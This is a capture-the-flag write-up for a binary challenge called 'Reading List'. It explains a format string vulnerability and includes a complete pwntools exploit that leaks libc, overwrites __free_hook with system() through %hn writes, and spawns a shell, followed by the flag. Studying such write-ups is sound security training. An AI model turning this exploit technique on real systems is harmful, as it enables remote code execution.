# Reading List

## Challenge

The program allows the user to choose actions from a menu to add, remove, or print entries.
It also asks for the user's name and allows the user to change their name at any point.

All standard mitigations are enabled.

## Solution

There is a format string vulernability in the `print_list()` and `remove_book()` functions.
When we print our books, the input is used directly as the format string, allowing us to insert our own conversion specifiers.

We start by using this vulnerability to leak the libc address from the stack.

Once we have the libc address, we can overwrite `__free_hook`.
To do so, we need to put addresses to `__free_hook` on the stack.
Fortunately, our name is stored on the stack.
We can enter 3 addresses on the stack, each covering a different word in `_free_hook`.

Each of these 3 addresses can be written to by a different entry.
For each write, we create one book with a format string payload to overwrite it with part of the `system()` address.
We then add an entry with `"/bin/sh"` so we can delete to call `system("/bin/sh")`.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 32355 reading_list
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('reading_list')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 32355)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

libc = ELF('libc-2.31.so')

io = start()

io.sendlineafter(b"What is your name: ", b"")

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the book name: ", b"%23$p")

io.sendlineafter(b"> ", b"1")
io.recvuntil(b"1. ")
libc.address = int(io.recvline(), 0) - libc.libc_start_main_return

info("LIBC: " + hex(libc.address))

io.sendlineafter(b"> ", b"4")
io.sendlineafter(b"What is your name: ", flat([
    libc.sym['__free_hook'] + 0,
    libc.sym['__free_hook'] + 2,
    libc.sym['__free_hook'] + 4,
    ]))

fmt = ""
written = 0
to_write = 0

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the book name: ", f"%{(libc.sym['system']) % 0x10000}c%22$hn".encode())

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the book name: ", f"%{(libc.sym['system'] >> 0x10) % 0x10000}c%23$hn".encode())

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the book name: ", f"%{(libc.sym['system'] >> 0x20) % 0x10000}c%24$hn".encode())

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the book name: ", b"/bin/sh")

io.sendlineafter(b"> ", b"3")
io.sendlineafter(b": ", b"5")

io.interactive()
```

## Flag

```
flag{1b0d16889d3b8a1cb31232763b51a03d}
```